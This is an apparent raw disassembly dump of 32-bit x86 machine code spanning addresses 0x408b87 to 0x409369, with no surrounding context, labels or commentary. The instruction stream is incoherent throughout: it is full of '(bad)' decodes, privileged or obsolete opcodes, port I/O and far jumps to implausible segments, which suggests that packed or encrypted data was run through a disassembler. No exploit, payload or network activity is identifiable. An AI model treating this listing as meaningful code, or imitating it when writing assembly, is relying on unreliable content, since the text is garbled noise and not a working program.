  408b87:	mov    ebx,0x3fefb670
  408b8c:	outs   dx,BYTE PTR ds:[esi]
  408b8d:	jo     0x408b44
  408b8f:	test   eax,0x8d26cd19
  408b94:	iret   
  408b95:	and    al,0x95
  408b97:	leave  
  408b98:	dec    edi
  408b99:	call   0x5b48:0x6200ffae
  408ba0:	sbb    DWORD PTR [ecx-0x26f434fc],edx
  408ba6:	push   ebx
  408ba7:	inc    eax
  408ba8:	fbld   TBYTE PTR ds:0xba83f53d
  408bae:	enter  0x9885,0xf6
  408bb2:	jmp    0x8b535be1
  408bb7:	and    BYTE PTR [ebx+ebp*8-0x48],bl
  408bbb:	sbb    ch,cl
  408bbd:	jbe    0x408c30
  408bbf:	or     bh,BYTE PTR [esi+0x24]
  408bc2:	mov    dh,0x9a
  408bc4:	es pop ecx
  408bc6:	(bad)  
  408bc7:	mov    esi,ecx
  408bc9:	dec    DWORD PTR [ebp-0x15]
  408bcc:	(bad)  
  408bcd:	into   
  408bce:	xor    ebp,DWORD PTR [eax+0x20]
  408bd1:	adc    DWORD PTR ds:0xa5248ebe,edx
  408bd7:	adc    al,0x72
  408bd9:	mov    bh,0x26
  408bdb:	shl    ebp,1
  408bdd:	aas    
  408bde:	jb     0x408bda
  408be0:	jnp    0x408bcf
  408be2:	push   edi
  408be3:	xchg   edx,eax
  408be4:	adc    al,0x3d
  408be6:	cdq    
  408be7:	mov    eax,ds:0x868260ab
  408bec:	(bad)  
  408bed:	mov    BYTE PTR [eax+0x178fa87d],bl
  408bf3:	xor    dl,BYTE PTR [edx-0xd916ff3]
  408bf9:	and    BYTE PTR [ebp+0x37fc9dd8],0x72
  408c00:	hlt    
  408c01:	pop    ecx
  408c02:	(bad)
  408c05:	dec    edx
  408c06:	jo     0x408c51
  408c08:	mov    WORD PTR [ecx+0x56],es
  408c0b:	adc    dh,BYTE PTR [edx+0x43]
  408c0e:	jne    0x408c58
  408c10:	xor    al,0x65
  408c12:	shl    ch,cl
  408c14:	sahf   
  408c15:	push   esp
  408c16:	arpl   sp,cx
  408c18:	lods   eax,DWORD PTR ds:[esi]
  408c19:	pop    ebp
  408c1a:	push   ss
  408c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c1c:	hlt    
  408c1d:	std    
  408c1e:	pop    es
  408c1f:	or     al,0x43
  408c21:	lea    ebp,[ecx-0x7cd8460e]
  408c27:	xchg   edi,eax
  408c28:	mov    cl,0xeb
  408c2a:	ret    0x73aa
  408c2d:	mov    bl,0x90
  408c2f:	fnsetpm(287 only) 
  408c31:	sbb    DWORD PTR [ebx+0x7a9372b],esi
  408c37:	adc    al,0x2d
  408c39:	xor    ah,BYTE PTR [esi+edx*2+0x3aaef114]
  408c40:	pop    edx
  408c41:	cmp    ebx,ebx
  408c43:	mov    BYTE PTR [esi+0x70aeb0bc],cl
  408c49:	pop    es
  408c4a:	(bad)  
  408c4c:	jle    0x408c34
  408c4e:	icebp  
  408c4f:	and    BYTE PTR [ebx],0x9b
  408c52:	mov    ah,0x83
  408c54:	mov    ch,0x77
  408c56:	adc    ecx,eax
  408c58:	add    ch,BYTE PTR [ebx+0x7b]
  408c5b:	jmp    FWORD PTR [edx-0x705b89a0]
  408c61:	popa   
  408c62:	push   ebx
  408c63:	push   edx
  408c64:	imul   ebx,DWORD PTR [ebx+0x2b],0xbae0843d
  408c6b:	and    edx,esi
  408c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c6e:	(bad)  
  408c6f:	iret   
  408c70:	sub    ebp,esp
  408c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c73:	ss scas eax,DWORD PTR es:[edi]
  408c75:	inc    esi
  408c76:	lea    esp,[esi+0xb906215]
  408c7c:	push   ds
  408c7d:	cmp    DWORD PTR [ecx+0x7126bd34],ebp
  408c83:	or     al,0xb4
  408c85:	jle    0x408cc4
  408c87:	jne    0x408d06
  408c89:	adc    al,0xed
  408c8b:	fdiv   DWORD PTR [ecx-0x546a37a1]
  408c91:	xchg   DWORD PTR [edi+0x57cd26e8],ecx
  408c97:	dec    esp
  408c98:	scas   al,BYTE PTR es:[edi]
  408c99:	call   0x4c18c189
  408c9e:	push   ds
  408c9f:	xchg   ecx,eax
  408ca0:	push   0xffffffde
  408ca2:	mov    WORD PTR fs:[ebx+0x1],es
  408ca6:	inc    ebp
  408ca7:	xchg   esp,eax
  408ca8:	pop    eax
  408ca9:	or     BYTE PTR [edx-0x1],0xf4
  408cad:	js     0x408c36
  408caf:	push   ebx
  408cb0:	gs call 0xbe3ba8ce
  408cb6:	sar    DWORD PTR [ebx],1
  408cb8:	nop
  408cb9:	loop   0x408c95
  408cbb:	call   0x8b8c:0xaf4ecbcb
  408cc2:	mov    ch,0xee
  408cc4:	fsubr  QWORD PTR [esi+0x59]
  408cc7:	retf   0xdd0e
  408cca:	mov    ds:0x12201594,eax
  408ccf:	adc    edx,DWORD PTR [edx-0x4a7bf686]
  408cd5:	jno    0x408c92
  408cd7:	sbb    eax,0x522c69cd
  408cdc:	pushf  
  408cdd:	xor    DWORD PTR [ecx-0x1a17fb1],ebx
  408ce3:	adc    eax,0xe48de1cf
  408ce8:	adc    cl,0xa9
  408ceb:	ss pop edx
  408ced:	push   edi
  408cee:	shl    al,0x78
  408cf1:	dec    edx
  408cf2:	nop
  408cf3:	pop    ds
  408cf4:	mov    bl,0xee
  408cf6:	push   esp
  408cf7:	mov    esp,DWORD PTR [ebp-0x3c]
  408cfa:	push   edi
  408cfb:	lahf   
  408cfc:	sbb    ebx,edx
  408cfe:	xchg   ebx,eax
  408cff:	push   esp
  408d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d01:	jle    0x408d1d
  408d03:	in     al,dx
  408d04:	stc    
  408d05:	repz lahf 
  408d07:	ret    
  408d08:	dec    esp
  408d09:	(bad)  
  408d0a:	std    
  408d0b:	js     0x408cab
  408d0d:	xchg   ebp,eax
  408d0e:	mov    ah,dh
  408d10:	lahf   
  408d11:	stc    
  408d12:	stc    
  408d13:	ror    DWORD PTR [esi+0x2c],1
  408d16:	icebp  
  408d17:	stc    
  408d18:	js     0x408d40
  408d1a:	jb     0x408d93
  408d1c:	ror    BYTE PTR [ebx+0x488840f1],1
  408d22:	jl     0x408d02
  408d24:	fidivr WORD PTR [ebx-0x32ecb2ec]
  408d2a:	sbb    BYTE PTR ds:0x5fac5e18,bh
  408d30:	cmp    ecx,ebp
  408d32:	mov    bl,BYTE PTR [esi+0x3fae235f]
  408d38:	mov    al,0xfc
  408d3a:	sub    eax,0xcdb3305f
  408d3f:	push   esi
  408d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d41:	js     0x408d41
  408d43:	shr    BYTE PTR [edx-0x2638c023],1
  408d49:	gs cmp eax,0x390c3e7
  408d4f:	jmp    0x306:0x8912091c
  408d56:	(bad)  
  408d57:	daa    
  408d58:	push   ebx
  408d59:	sub    edi,DWORD PTR [ecx]
  408d5b:	pusha  
  408d5c:	bound  eax,QWORD PTR [ecx]
  408d5e:	sub    bl,BYTE PTR [edx-0x21]
  408d61:	sti    
  408d62:	add    eax,0xa1e7d2c2
  408d67:	aam    0x63
  408d69:	xor    dh,BYTE PTR [edi+0x5e06bdcf]
  408d6f:	lods   al,BYTE PTR ds:[esi]
  408d70:	xor    eax,0x2669b078
  408d75:	adc    al,0xca
  408d77:	ds pop eax
  408d79:	out    dx,eax
  408d7a:	push   edi
  408d7b:	cwde   
  408d7c:	sbb    DWORD PTR gs:[ebx+0x75],edx
  408d80:	ss leave 
  408d82:	in     eax,0x69
  408d84:	out    dx,al
  408d85:	mov    ds:0x8845e899,al
  408d8a:	push   cs
  408d8b:	jle    0x408deb
  408d8d:	les    esp,FWORD PTR [esi+0x6f]
  408d90:	retf   0x6fdc
  408d93:	je     0x408d41
  408d95:	or     BYTE PTR [eax-0x5453f094],0x7c
  408d9c:	lahf   
  408d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d9e:	int    0xfa
  408da0:	xchg   ebp,eax
  408da1:	retf   0xd50f
  408da4:	test   DWORD PTR [ebp+0x7219cb6e],edi
  408daa:	mov    al,ds:0x9f26c1a2
  408daf:	xchg   ebp,eax
  408db0:	pop    ebp
  408db1:	inc    edi
  408db2:	add    al,0x4c
  408db4:	stos   BYTE PTR es:[edi],al
  408db5:	pinsrw mm1,WORD PTR [edi],0x7d
  408db9:	add    edx,DWORD PTR [edx]
  408dbb:	por    mm7,QWORD PTR ds:0x25696375
  408dc2:	pop    eax
  408dc3:	fwait
  408dc4:	sahf   
  408dc5:	push   edi
  408dc6:	cmp    al,0x5d
  408dc8:	or     dl,BYTE PTR [esi+0x53]
  408dcb:	sub    DWORD PTR [esi+eax*1+0x3eab5d2f],edx
  408dd2:	rcl    eax,cl
  408dd4:	inc    ebx
  408dd5:	fcmovbe st,st(1)
  408dd7:	pop    ebp
  408dd8:	mov    eax,0xbb98a0ee
  408ddd:	das    
  408dde:	inc    ecx
  408ddf:	daa    
  408de0:	std    
  408de1:	inc    esi
  408de2:	xchg   ecx,eax
  408de3:	sub    esi,DWORD PTR [edi+0x52]
  408de6:	dec    ebp
  408de7:	and    ebp,DWORD PTR [esi+edx*1+0x50]
  408deb:	in     eax,dx
  408dec:	loop   0x408d79
  408dee:	std    
  408def:	rol    DWORD PTR [ebx-0x5e],1
  408df2:	out    0xa5,al
  408df4:	fisttp WORD PTR [esi-0x5c]
  408df7:	jo     0x408dfc
  408df9:	add    BYTE PTR [ebp+0x42026978],0x12
  408e00:	sbb    al,0xf5
  408e02:	xchg   ebp,eax
  408e03:	cs es pop ebp
  408e06:	dec    edx
  408e07:	arpl   bp,ax
  408e09:	fdiv   DWORD PTR [ebx]
  408e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e0c:	xchg   DWORD PTR [esi-0x74],edi
  408e0f:	into   
  408e10:	xchg   BYTE PTR [ecx-0x45776db7],ah
  408e16:	rcl    DWORD PTR [esi+0xf69f32d],0xae
  408e1d:	arpl   WORD PTR [eax+0x4f0d5e95],ax
  408e23:	call   0x8187:0xececd655
  408e2a:	ins    BYTE PTR es:[edi],dx
  408e2b:	pushf  
  408e2c:	pop    esp
  408e2d:	ja     0x408e76
  408e2f:	repz les esi,FWORD PTR [eax+0x1b]
  408e33:	or     BYTE PTR [ebx-0x3a6e5f0],ah
  408e39:	push   ss
  408e3a:	loopne 0x408e2e
  408e3c:	call   0x1e699dd2
  408e41:	loopne 0x408de2
  408e43:	push   ss
  408e44:	sub    DWORD PTR [ecx+0x7e],esi
  408e47:	js     0x408e39
  408e49:	sub    DWORD PTR [eax-0x54605177],esp
  408e4f:	cmc    
  408e50:	or     eax,DWORD PTR fs:[esi-0x7c]
  408e54:	mov    eax,0xcd095fc0
  408e59:	fsubr  QWORD PTR [esi+0x66]
  408e5c:	add    DWORD PTR [edx],esi
  408e5e:	push   cs
  408e5f:	mov    bl,0xcb
  408e61:	enter  0x46b0,0x2e
  408e65:	mov    ch,0xf9
  408e67:	adc    DWORD PTR [ebx+0x19457ec6],edx
  408e6d:	cs dec edx
  408e6f:	push   cs
  408e70:	push   0xee7c36d2
  408e75:	mov    dl,0x5e
  408e77:	neg    cl
  408e79:	inc    eax
  408e7a:	mov    al,ds:0x2f5ec361
  408e7f:	das    
  408e80:	neg    DWORD PTR [ecx]
  408e82:	ds dec edi
  408e84:	sub    eax,0x914256f2
  408e89:	in     eax,0x77
  408e8b:	xor    DWORD PTR [eax-0x7ba41cf4],ebx
  408e91:	inc    eax
  408e92:	(bad)  
  408e93:	in     eax,dx
  408e94:	sbb    bl,BYTE PTR [eax]
  408e96:	cdq    
  408e97:	arpl   sp,sp
  408e99:	ds mov bl,0x75
  408e9c:	cwde   
  408e9d:	hlt    
  408e9e:	cwde   
  408e9f:	les    esp,FWORD PTR [eax]
  408ea1:	ret    0x8444
  408ea4:	(bad)  
  408ea5:	cs ins BYTE PTR es:[edi],dx
  408ea7:	dec    eax
  408ea8:	adc    bl,bh
  408eaa:	adc    esi,DWORD PTR [ebx+eiz*4+0xed532e9]
  408eb1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408eb3:	mov    dh,0x7b
  408eb5:	inc    esi
  408eb6:	fild   QWORD PTR [edi]
  408eb8:	mov    esp,0xabbc635b
  408ebd:	dec    ecx
  408ebe:	or     al,0xd3
  408ec0:	stos   DWORD PTR es:[edi],eax
  408ec1:	(bad)  
  408ec2:	jge    0x408f42
  408ec4:	imul   edi,DWORD PTR [edi-0x4c],0x5d80e246
  408ecb:	dec    edi
  408ecc:	add    esi,DWORD PTR [eax]
  408ece:	sbb    BYTE PTR [ecx-0x25],al
  408ed1:	push   0xc8bb5cfe
  408ed6:	inc    ebp
  408ed7:	ja     0x408eb0
  408ed9:	or     al,0x7f
  408edb:	or     DWORD PTR [eax-0x7415e188],0x5f
  408ee2:	popf   
  408ee3:	test   al,0x55
  408ee5:	or     eax,0x4cbd3f17
  408eea:	adc    edx,DWORD PTR [edi+eiz*2-0x489bbf5b]
  408ef1:	cmp    eax,0x4d4895b7
  408ef6:	sbb    al,0x4f
  408ef8:	js     0x408f73
  408efa:	jb     0x408ea7
  408efc:	inc    edi
  408efd:	ins    DWORD PTR es:[edi],dx
  408efe:	cdq    
  408eff:	mov    eax,0x66611f1b
  408f04:	sub    al,0x70
  408f06:	adc    DWORD PTR [eax-0x2221b1a9],0xbf6ce99c
  408f10:	mov    ds:0x78db69a5,eax
  408f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f17:	adc    DWORD PTR [edi+0x677c1af2],edx
  408f1d:	je     0x408ec4
  408f1f:	sbb    eax,0xf4749945
  408f24:	sti    
  408f25:	mov    DWORD PTR [eax],ecx
  408f27:	xor    BYTE PTR [ebx+eiz*4],0xa5
  408f2b:	pop    edi
  408f2c:	(bad)
  408f30:	xchg   ecx,eax
  408f31:	icebp  
  408f32:	cmp    al,0x4d
  408f34:	push   ebx
  408f35:	jecxz  0x408f19
  408f37:	mov    ah,0x19
  408f39:	mov    bl,0x4a
  408f3c:	cdq    
  408f3d:	aaa    
  408f3e:	adc    esp,eax
  408f40:	mov    DWORD PTR [esi-0x1bb39268],esp
  408f46:	jmp    0x1505b48d
  408f4b:	je     0x408f92
  408f4d:	out    0x64,al
  408f4f:	xor    al,0x18
  408f51:	retf   0x202f
  408f54:	inc    esp
  408f55:	push   esp
  408f56:	sahf   
  408f57:	es dec edi
  408f59:	popf   
  408f5a:	mov    ds:0x51bb01a,eax
  408f5f:	ja     0x408f8d
  408f61:	sbb    esi,DWORD PTR [ecx+0x66121742]
  408f67:	mov    ah,0xc6
  408f69:	cmp    edx,DWORD PTR [esi+0x1f]
  408f6c:	inc    esi
  408f6d:	push   edx
  408f6e:	pop    edi
  408f6f:	imul   esi,DWORD PTR ss:[eax-0x5],0x4a
  408f74:	jmp    0x408f89
  408f76:	mov    al,0x5f
  408f78:	push   ebx
  408f79:	pop    ebp
  408f7a:	popf   
  408f7b:	ds cmp al,0x64
  408f7e:	repnz mov edi,DWORD PTR [edx]
  408f81:	pop    ebx
  408f82:	adc    ebx,esp
  408f84:	inc    esi
  408f85:	jg     0x408f50
  408f87:	rcl    DWORD PTR ds:0x6ec7ea66,0xb1
  408f8e:	xchg   esp,eax
  408f8f:	dec    edx
  408f90:	add    ah,BYTE PTR [edi]
  408f92:	pushf  
  408f93:	adc    BYTE PTR [ebx],cl
  408f95:	push   ds
  408f96:	xor    al,0x3b
  408f98:	mov    ebx,0x17a73d60
  408f9d:	(bad)  
  408f9e:	out    0x90,al
  408fa0:	jl     0x40900f
  408fa2:	fild   QWORD PTR [edx-0x43]
  408fa5:	cmp    al,0x19
  408fa7:	inc    ecx
  408fa8:	mov    BYTE PTR [edi-0x37],bl
  408fab:	pop    ds
  408fac:	gs into 
  408fae:	retf   0x1c9c
  408fb1:	shr    BYTE PTR [esi],1
  408fb3:	retf   0x74a2
  408fb6:	push   es
  408fb7:	ds call 0xf2fe:0xc41edff7
  408fbf:	jl     0x408f97
  408fc1:	test   al,0xeb
  408fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fc4:	adc    bl,BYTE PTR [ecx-0x45c985af]
  408fca:	mov    eax,0x2e3039d1
  408fcf:	xlat   BYTE PTR ds:[ebx]
  408fd0:	push   edi
  408fd1:	mov    bh,BYTE PTR [edi-0x2c]
  408fd4:	mov    ah,0xcd
  408fd6:	push   cs
  408fd7:	mov    ebx,0xe251c0e1
  408fdc:	and    DWORD PTR [ecx],ebx
  408fde:	sbb    al,0xe5
  408fe0:	push   esp
  408fe1:	imul   ch
  408fe3:	or     BYTE PTR [ecx-0x2],0x70
  408fe7:	xchg   BYTE PTR ds:0xb4b097d7,bh
  408fed:	jb     0x408f92
  408fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ff0:	fucom  st(3)
  408ff2:	stc    
  408ff3:	mov    ebp,0xdb9b7318
  408ff8:	jmp    0x408f9a
  408ffa:	int    0x55
  408ffc:	popa   
  408ffd:	add    ah,0xef
  409000:	jnp    0x408ff5
  409002:	mov    ebp,0x54baa152
  409007:	push   es
  409008:	lods   al,BYTE PTR ds:[esi]
  409009:	xor    ah,BYTE PTR [eax]
  40900b:	imul   edx,DWORD PTR [ebx+0x1694c384],0x1
  409012:	mov    esp,0xd8279e5f
  409017:	mov    ecx,0x428eb56d
  40901c:	test   DWORD PTR [ecx+edi*1+0x5145179],0x3cfac9fc
  409027:	sub    ebp,edx
  409029:	dec    eax
  40902a:	lock or dl,BYTE PTR [ebp-0x32]
  40902e:	and    al,0x7b
  409030:	inc    ebx
  409031:	hlt    
  409032:	push   esi
  409033:	push   0x7b
  409035:	pop    ss
  409036:	jmp    0xc830176
  40903b:	cmp    DWORD PTR [ebx+0x49],ebx
  40903e:	(bad)  
  40903f:	fs cmc 
  409041:	ins    DWORD PTR es:[edi],dx
  409042:	xor    BYTE PTR [esi+ecx*1+0x2db4295],ah
  409049:	test   BYTE PTR [edx+0x15],dh
  40904c:	xor    ah,dl
  40904e:	aaa    
  40904f:	mov    ds:0xd94c80c6,al
  409054:	retf   0xd528
  409057:	out    dx,al
  409058:	sbb    BYTE PTR [eax+edi*8-0x5b],ah
  40905c:	call   0xc07e111d
  409061:	mov    edx,0xe47c7b67
  409066:	hlt    
  409067:	pop    esi
  409068:	popf   
  409069:	adc    eax,0x9f3011af
  40906e:	sub    al,0x6d
  409070:	mov    esp,0xc9f5fd7f
  409075:	ret    0xc4e8
  409078:	push   edx
  409079:	mov    WORD PTR [ebp+0x75],gs
  40907c:	addr16 mov ecx,0x61e2e1d5
  409082:	mov    ah,0x43
  409084:	cmp    DWORD PTR ds:0x8389347,edx
  40908a:	xchg   DWORD PTR [ecx-0x46bd0ef2],esi
  409090:	xor    cl,BYTE PTR [ecx-0x1c36d7fb]
  409096:	aaa    
  409097:	gs cmp esi,0xdfee6a6d
  40909e:	pushf  
  40909f:	inc    ebx
  4090a0:	in     al,0xec
  4090a2:	mov    edi,0xa7fa338c
  4090a7:	call   0x53e2:0x6fe6ab15
  4090ae:	lods   al,BYTE PTR ds:[esi]
  4090af:	cmp    al,0xc9
  4090b1:	pop    edi
  4090b2:	(bad)  
  4090b5:	ja     0x4090f6
  4090b7:	sub    edi,ebp
  4090b9:	in     al,0x33
  4090bb:	icebp  
  4090bc:	ds loope 0x40908f
  4090bf:	inc    edi
  4090c0:	ins    BYTE PTR es:[edi],dx
  4090c1:	test   ah,dh
  4090c3:	mov    WORD PTR [eax-0x4c],?
  4090c6:	out    dx,eax
  4090c7:	pop    es
  4090c8:	xchg   BYTE PTR [edi-0x1794e363],ch
  4090ce:	jmp    0x1e9b890e
  4090d3:	add    ebx,DWORD PTR [eax-0x76]
  4090d6:	ss inc edx
  4090d8:	xor    eax,ebx
  4090da:	add    BYTE PTR [ebx+0x35],cl
  4090dd:	(bad)  
  4090de:	repnz cdq 
  4090e0:	mov    al,0x1
  4090e2:	fstp   DWORD PTR [ebp+0x78]
  4090e5:	sbb    BYTE PTR [esi-0x34],0xc0
  4090e9:	pop    ebx
  4090ea:	sbb    bh,dl
  4090ec:	jno    0x409095
  4090ee:	add    BYTE PTR gs:[eax],0x64
  4090f2:	add    edi,DWORD PTR [edx-0x12]
  4090f5:	data16 in al,dx
  4090f7:	mov    al,ds:0x1f764a28
  4090fc:	shl    DWORD PTR [ebp-0x5e760016],cl
  409102:	xchg   DWORD PTR [ebp+0x1a],esp
  409105:	push   esp
  409106:	inc    ecx
  409107:	out    dx,al
  409108:	nop
  409109:	shl    DWORD PTR [ebx-0x64f06d97],0xd
  409110:	popa   
  409111:	cmp    BYTE PTR [ebp-0x2c],al
  409114:	int3   
  409115:	arpl   WORD PTR [edx],cx
  409117:	inc    esi
  409118:	retf   
  409119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40911a:	std    
  40911b:	sub    DWORD PTR [ebx+0x46],edx
  40911e:	test   al,0x6
  409120:	or     BYTE PTR [edx+0xb6285fc],ah
  409126:	fisub  DWORD PTR [edi+ecx*4-0x2027e61]
  40912d:	mov    dh,0xa4
  40912f:	mov    ?,esp
  409131:	imul   BYTE PTR gs:[edi+0x652db061]
  409138:	push   ss
  409139:	mov    edx,0x1fbd2ec3
  40913e:	mov    ds:0xc68b7b7b,eax
  409143:	xchg   ebx,eax
  409144:	fstp   DWORD PTR [edi+eax*4]
  409147:	dec    ebp
  409148:	loope  0x4091a3
  40914a:	hlt    
  40914b:	pop    ecx
  40914c:	retf   0xd681
  40914f:	add    al,0x5f
  409151:	inc    ecx
  409152:	outs   dx,DWORD PTR ds:[esi]
  409153:	xlat   BYTE PTR ds:[ebx]
  409154:	fnsave [ecx+0x60]
  409157:	add    DWORD PTR [ecx-0x62],ebp
  40915a:	push   0x1b
  40915c:	mov    cl,0x1a
  40915e:	gs cmp al,0x9d
  409161:	popa   
  409162:	sub    eax,0x78c92640
  409167:	cmp    edx,DWORD PTR [esi]
  409169:	mov    bh,0x84
  40916b:	mov    dl,0xfc
  40916d:	aam    0xdc
  40916f:	arpl   sp,di
  409171:	fistp  QWORD PTR [edx-0x1f65ee10]
  409177:	jnp    0x409172
  409179:	je     0x409190
  40917b:	icebp  
  40917c:	scas   eax,DWORD PTR es:[edi]
  40917d:	ss retf 
  40917f:	mov    ecx,0x19790ca
  409184:	retf   
  409185:	cmc    
  409186:	inc    edi
  409187:	adc    BYTE PTR ds:0xe3c56558,ch
  40918d:	cmp    al,0x99
  40918f:	pop    esi
  409190:	test   al,0xf0
  409192:	pop    ecx
  409193:	and    DWORD PTR [ecx],0xffffffa0
  409196:	cld    
  409197:	jb     0x4091e9
  409199:	ins    BYTE PTR es:[edi],dx
  40919a:	out    dx,eax
  40919b:	and    DWORD PTR [esi],ebp
  40919d:	repnz mov al,ds:0xea1aee9a
  4091a3:	xchg   esi,eax
  4091a4:	sub    ebp,ebx
  4091a6:	sbb    al,0xd9
  4091a8:	addr16 lahf 
  4091aa:	stos   BYTE PTR es:[edi],al
  4091ab:	fisubr WORD PTR [eax-0x5d]
  4091ae:	sbb    edi,DWORD PTR [edi+0x955c9d0]
  4091b4:	mov    eax,ds:0x89505e17
  4091b9:	xchg   bl,ch
  4091bb:	(bad)  
  4091bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091bd:	adc    DWORD PTR [esi-0x5c2fcd8e],esi
  4091c3:	inc    ebx
  4091c4:	shl    BYTE PTR gs:[esi],cl
  4091c7:	cmp    ebp,edi
  4091c9:	imul   BYTE PTR [ecx]
  4091cb:	jbe    0x409195
  4091cd:	iret   
  4091ce:	outs   dx,DWORD PTR ds:[esi]
  4091cf:	(bad)  
  4091d0:	call   0xa351:0xd78496bf
  4091d7:	or     eax,0xe6c8620b
  4091dc:	not    DWORD PTR [edx+eax*8+0x3fdef1a2]
  4091e3:	(bad)  
  4091e4:	into   
  4091e5:	inc    ebx
  4091e6:	mov    eax,0x32a703a0
  4091eb:	inc    ebx
  4091ec:	int    0xfc
  4091ee:	dec    edi
  4091ef:	dec    edi
  4091f0:	cmp    DWORD PTR [edx+0x6c],ebx
  4091f3:	inc    ebp
  4091f4:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f7:	and    ecx,edx
  4091f9:	adc    BYTE PTR [ebx+0x55388a2e],al
  4091ff:	cld    
  409200:	or     DWORD PTR [ebx+ebx*1],ebp
  409203:	out    0x70,al
  409205:	push   0xffffffa1
  409207:	gs mov ah,0xa1
  40920a:	xlat   BYTE PTR ds:[ebx]
  40920b:	lahf   
  40920c:	sbb    cl,BYTE PTR [ebx+0x62f0100b]
  409212:	neg    BYTE PTR [edx-0x4427c141]
  409218:	cdq    
  409219:	out    dx,al
  40921a:	std    
  40921b:	or     dh,bh
  40921d:	push   esi
  40921e:	lahf   
  40921f:	repz fsub QWORD PTR [ecx+edx*1+0x78]
  409224:	cs mov esp,esi
  409227:	in     eax,dx
  409228:	mov    ebx,0x922c0bd9
  40922d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922f:	xchg   BYTE PTR [eax-0x64],ch
  409232:	je     0x409211
  409234:	cwde   
  409235:	int3   
  409236:	fsubp  st(5),st
  409238:	inc    esp
  409239:	ds jg  0x4091ce
  40923c:	imul   ebp,DWORD PTR ds:0x1ab49dd6,0x73
  409243:	fst    DWORD PTR [eax]
  409245:	push   0x8a2f9edf
  40924a:	ret    0x27e0
  40924d:	es retf 0xa58e
  409251:	mov    cl,0x99
  409253:	cmp    esp,DWORD PTR [ebp+0x728d2bec]
  409259:	mov    eax,ds:0x30881bb8
  40925e:	xor    ecx,DWORD PTR [esi+ebx*2]
  409261:	cmp    DWORD PTR [edi+0x1ca6dc94],ecx
  409267:	xchg   esp,eax
  409268:	push   cs
  409269:	xor    eax,ebp
  40926b:	sub    eax,0x193b4008
  409270:	ja     0x409297
  409272:	or     al,0xd
  409274:	push   cs
  409275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409276:	popa   
  409277:	fbld   TBYTE PTR [ecx]
  409279:	arpl   WORD PTR [esi],bp
  40927b:	mov    bl,0x26
  40927d:	or     esi,DWORD PTR [esi]
  40927f:	fbstp  TBYTE PTR [esp+eiz*8]
  409282:	cmp    al,0xd6
  409284:	mov    esi,0xe2b6cd76
  409289:	mov    bh,0xe0
  40928b:	mov    bh,0xb6
  40928d:	data16 mov ?,WORD PTR [ecx]
  409290:	pop    ds
  409291:	and    al,0x40
  409293:	push   edi
  409294:	gs sbb al,0xdf
  409297:	test   DWORD PTR [esi+0x69c796bb],0xdd3a2f3
  4092a1:	add    dh,cl
  4092a3:	shl    DWORD PTR [ebp+0x76],cl
  4092a6:	(bad)  
  4092a7:	mov    ecx,0x449f6a0b
  4092ac:	imul   DWORD PTR [eax-0x4f]
  4092af:	call   0x263a7a73
  4092b4:	and    edi,DWORD PTR [eax-0x11]
  4092b7:	stos   DWORD PTR es:[edi],eax
  4092b8:	sbb    BYTE PTR [ecx],cl
  4092ba:	std    
  4092bb:	jmp    0x45c0:0xb2a0170c
  4092c2:	bound  ebp,QWORD PTR [eax]
  4092c4:	das    
  4092c5:	inc    esp
  4092c6:	mov    bl,0x94
  4092c8:	das    
  4092c9:	sbb    ebx,DWORD PTR [esi+0x5e51020e]
  4092cf:	mov    BYTE PTR [ecx+0x5580b865],dh
  4092d5:	in     eax,0x17
  4092d7:	std    
  4092d8:	jae    0x4092c4
  4092da:	dec    ecx
  4092db:	ds push ds
  4092dd:	xchg   esp,eax
  4092de:	inc    edx
  4092df:	sahf   
  4092e0:	arpl   WORD PTR [ebp-0x7b0c0f37],bp
  4092e6:	and    BYTE PTR [eax-0x4a2cc093],bl
  4092ec:	ror    BYTE PTR [esi+ebx*1+0x93e2f1b],0x52
  4092f4:	pop    ebx
  4092f5:	pop    ebx
  4092f6:	mov    al,dl
  4092f8:	mov    eax,ds:0x594233ed
  4092fd:	jno    0x409293
  4092ff:	xor    edx,DWORD PTR [ebx]
  409301:	stc    
  409302:	scas   eax,DWORD PTR es:[edi]
  409303:	test   BYTE PTR [esi+0x81f1507],ah
  409309:	ss pop esp
  40930b:	int3   
  40930c:	fadd   DWORD PTR [ecx-0x2d7a0c0e]
  409312:	pop    ebx
  409313:	jge    0x4092e7
  409315:	(bad)  [edi]
  409317:	aas    
  409318:	out    0x6d,eax
  40931a:	adc    eax,DWORD PTR [ebx-0x33c71195]
  409320:	daa    
  409321:	gs lods eax,DWORD PTR ss:[esi]
  409324:	dec    esp
  409325:	push   ebx
  409326:	call   0x9d6b9c42
  40932b:	(bad)  
  40932c:	repnz mov bl,0xc5
  40932f:	inc    ebp
  409330:	je     0x409303
  409332:	jbe    0x409371
  409334:	pop    ecx
  409335:	mov    al,0x28
  409337:	hlt    
  409338:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933a:	in     al,0x9a
  40933c:	adc    BYTE PTR [ebx+0x2f39329b],ch
  409342:	pop    edx
  409343:	outs   dx,BYTE PTR ds:[esi]
  409344:	adc    esi,DWORD PTR [edi+0x7920593f]
  40934a:	mov    dh,0x30
  40934c:	shr    DWORD PTR [edi-0x70],1
  40934f:	inc    ecx
  409350:	pushf  
  409351:	inc    edi
  409352:	mov    WORD PTR [esi-0x367709b7],fs
  409358:	inc    esp
  409359:	mov    eax,ds:0x582421fc
  40935e:	jle    0x4093c4
  409360:	xchg   esi,eax
  409361:	push   esi
  409362:	shl    BYTE PTR [ebp+edi*8-0x65],cl
  409366:	add    al,0xab
  409368:	pop    ebx
  409369:	daa    
